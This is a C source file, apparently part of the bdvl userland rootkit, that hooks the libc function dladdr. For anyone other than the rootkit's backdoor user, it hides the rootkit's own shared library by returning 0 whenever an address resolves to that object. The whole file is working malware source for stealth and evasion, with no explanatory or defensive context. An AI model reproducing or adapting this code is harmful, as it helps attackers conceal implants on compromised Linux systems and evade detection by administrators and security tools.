#include "../../util/util.h"

int dladdr(const void *addr, Dl_info *info)
{
    hook(CDLADDR);
    if(is_bdusr()) return (long)call(CDLADDR, addr, info);

    Dl_info bdvl_info;
    if((long)call(CDLADDR, addr, &bdvl_info) != 0 &&
        xstrstr(BDVLSO, bdvl_info.dli_fname)) return 0;

    return (long)call(CDLADDR, addr, info);
}
